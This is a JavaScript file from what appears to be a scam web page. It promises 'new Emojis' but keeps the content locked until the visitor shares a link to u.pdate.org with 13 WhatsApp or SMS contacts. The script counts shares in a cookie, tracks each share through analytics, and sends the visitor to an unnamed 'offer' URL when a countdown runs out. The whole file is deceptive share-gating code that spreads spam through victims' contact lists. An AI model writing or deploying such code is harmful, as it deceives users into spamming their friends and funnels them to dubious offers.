var TXT_SHARE_MESSAGE = "To activate the new Emojis you have to invite at least 13 contacts. 13 friends or 3 groups.\n\n So far you've only invited %d contacts.";
var TXT_WHATSAPP_MESSAGE = "WOW! check this out 😜😜 %0D%0A %s %0D%0A %0D%0A %0D%0A";
var TXT_SWITCH_WHATSAPP_MESSAGE = "WOW! check this out 😜😜 %0D%0A %s %0D%0A %0D%0A %0D%0A";
var TXT_LANGUAGE = "en";
var TXT_MOBILE = "Please share via your mobile browser.";

var share_enable = true;
var share_count = 13;
var share_url = "http://u.pdate.org/click";
var switch_urls = false;
var switch_wa_share_text = false;
var switch_after_x_shares = 5;
var switch_to_wa_url = "http://u.pdate.org/click";
var offer_url = "http://u.pdate.org/click";
var n = 300;

var wa_message = TXT_WHATSAPP_MESSAGE;
var c = getCookie( 'c' ),
		date = new Date(),
		time = date.getDate() + "/" + ( date.getMonth() + 1 )  + "/" + date.getFullYear() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds(),
		t = setInterval( function() {
			
			$( "#countdown" ).text( n-- ), -1 == n && window.open( offer_url, "_self" ) & clearInterval( t )
			
		}, 1e3 );

if ( !share_enable || ( c >= share_count ) ) {
	
	$( "#ask" ).hide();
	$( ".choose" ).hide();
	$( ".continue" ).hide();
	$( ".content" ).show();
	
} else if ( c != '' && c != null ) {
	
	$( "#ask" ).hide();
	$( ".choose" ).hide();
	$( ".continue" ).show();
	
} else {
	
	c = 0;
	
}

sharesLeft( c );

function fn1() {
	
	if ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test( navigator.userAgent ) ) {
		
		c++;
		
		if ( switch_urls && ( c > switch_after_x_shares ) ) {
			
			share_url = switch_to_wa_url;
			
		}
		
		if ( switch_wa_share_text && ( c > switch_after_x_shares ) ) {
			
			wa_message = TXT_SWITCH_WHATSAPP_MESSAGE;
			
		}
		
		location.href = ( "whatsapp://send?text=" + wa_message.replace( "%s", share_url ) + time );
		
		ga( 'send', 'event', 'WhatsApp', '[' + c + '][' + TXT_LANGUAGE + '] Emoticon' );
		
		setCookie( 'c', c, 2 ); // set cookie for 2 days
		
		showContent( c );
		
	} else {
		
		alert( TXT_MOBILE );
		
	}
	
}

function fn2() {
	
	alert( TXT_SHARE_MESSAGE.replace( "%d", c ) );
	
}

function fn3() {
	
	if ( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test( navigator.userAgent ) ) {
		
		c++;
		
		if ( switch_urls && ( c > switch_after_x_shares ) ) {
			
			share_url = switch_to_wa_url;
			
		}
		
		if ( switch_wa_share_text && ( c > switch_after_x_shares ) ) {
			
			wa_message = TXT_SWITCH_WHATSAPP_MESSAGE;
			
		}
		
		window.open( "sms:?body=" + wa_message.replace( "%s", share_url ) + time );
		
		ga( 'send', 'event', 'sms', '[' + c + '][' + TXT_LANGUAGE + '] Emoticon' );
		
		setCookie( 'c', c, 2 ); // set cookie for 2 days
		
		showContent( c );
		
	} else {
		
		alert( TXT_MOBILE );
		
	}
	
}

function showContent( c ) {
	
	if ( c < share_count ) {
		
		$( "#ask" ).hide();
		$( ".choose" ).hide();
		$( ".continue" ).show();
		
	}
	
	setTimeout( function() {
		
		if ( c >= share_count ) {
			
			$( ".continue" ).hide();
			$( ".content" ).show();
			
		}
		
		sharesLeft( c );
		
	}, 5000 );
	
}

function go() {
	
	ga( 'send', 'event', 'WhatsApp', '[complete][' + TXT_LANGUAGE + '] Emoticon' );
	
	window.location.replace( offer_url );
	
}

function sharesLeft( c ) {
	
	if ( c > share_count ) {
		
		$( "#shares" ).text( 0 );
		
	} else {
		
		$( "#shares" ).text( share_count - c );
		
	}
	
}

function setCookie( cname, cvalue, exdays ) {
	
	var d = new Date();
	d.setTime( d.getTime() + ( exdays * 24 * 60 * 60 * 1000 ) );
	var expires = 'expires=' + d.toGMTString();
	document.cookie = cname + '=' + cvalue + '; ' + expires;
	
}

function getCookie( cname ) {
	
	var name = cname + '=';
	var ca = document.cookie.split( ';' );
	for ( var i = 0; i < ca.length; i++ ) {
		
		var c = ca[ i ];
		while ( c.charAt( 0 ) == ' ' ) c = c.substring( 1 );
		
		if ( c.indexOf( name ) == 0 ) {
			
			return c.substring( name.length, c.length );
			
		}
		
	}
	
	return '';
	
}

$( document ).ready( function() {
	
	function shakeme1() {
		
		$( ".smile1" ).addClass( "shakeme" );
		
	}
	
	function shakeme2() {
		
		$( ".smile2" ).addClass( "shakeme" );
		
	}
	
	function shakeme3() {
		
		$( ".smile3" ).addClass( "shakeme" );
		
	}
	
	function shakeme4() {
		
		$( ".smile4" ).addClass( "shakeme" );
		
	}
	
	setTimeout( shakeme1, 1000 );
	setTimeout( shakeme2, 1500 );
	setTimeout( shakeme3, 2000 );
	setTimeout( shakeme4, 2500 );
	
} );
